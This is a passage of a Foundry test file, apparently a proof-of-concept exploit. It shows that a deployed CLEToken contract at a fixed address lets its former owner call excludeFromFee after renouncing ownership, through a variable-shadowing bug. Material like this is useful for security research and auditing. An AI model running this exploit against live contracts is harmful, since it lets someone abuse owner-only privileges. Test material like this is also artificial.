}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xDeEa8fdB85503531F6A5D2A036d3268bD7C06c09;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we're interacting with an already deployed contract
        // We need to impersonate the current owner first
        address currentOwner = CLEToken(TARGET).owner();
        vm.startPrank(currentOwner);

        // Give attacker some CLE tokens (attacker is address(this) in test context)
        deal(TARGET, attacker, 1000 * 10**9); // 1000 tokens with 9 decimals

        // Stop prank to return to attacker context
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get current owner
        address currentOwner = CLEToken(TARGET).owner();
        console.log("Current owner:", currentOwner);

        // Step 2: Give attacker some CLE tokens by transferring from owner
        // First, check owner's balance
        uint256 ownerBalance = CLEToken(TARGET).balanceOf(currentOwner);
        console.log("Owner balance:", ownerBalance);

        // Transfer some tokens to attacker
        vm.prank(currentOwner);
        // Transfer 1000 tokens (with 9 decimals) to attacker
        CLEToken(TARGET).transfer(attacker, 1000 * 10**9);

        // Verify attacker received tokens
        uint256 attackerBalance = CLEToken(TARGET).balanceOf(attacker);
        console.log("Attacker balance after transfer:", attackerBalance);
        require(attackerBalance > 0, "Attacker should have some CLE tokens");

        // Step 3: Renounce ownership as current owner
        vm.prank(currentOwner);
        CLEToken(TARGET).renounceOwnership();

        // Step 4: Verify owner is now address(0)
        address newOwner = CLEToken(TARGET).owner();
        console.log("Owner after renounce:", newOwner);
        require(newOwner == address(0), "Owner should be address(0) after renounce");

        // Step 5: Now try to call an owner-only function as the ORIGINAL owner (currentOwner)
        // This should succeed due to the variable shadowing bug
        vm.prank(currentOwner);

        // Store the result of the external call
        (bool success, bytes memory data) = TARGET.call(
            abi.encodeWithSignature("excludeFromFee(address)", currentOwner)
        );

        if (success) {
            console.log("SUCCESS: Original owner could call excludeFromFee() after renouncing!");

            // Verify the original owner is now excluded from fees
            bool isExcluded = CLEToken(TARGET).isExcludedFromFee(currentOwner);
            require(isExcluded, "Original owner should be excluded from fees");
            console.log("Verified: Original owner is excluded from fees");
        } else {
            // Extract error message if available
            if (data.length > 0) {
                // Skip the first 4 bytes (function selector) and decode the string
                string memory reason = abi.decode(data, (string));
                console.log("FAILED with error:", reason);
            } else {
                console.log("FAILED without error message");
            }
            // The test should fail if the function reverts
            revert("excludeFromFee() should not revert due to variable shadowing bug");
        }

        console.log("Vulnerability successfully exploited!");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

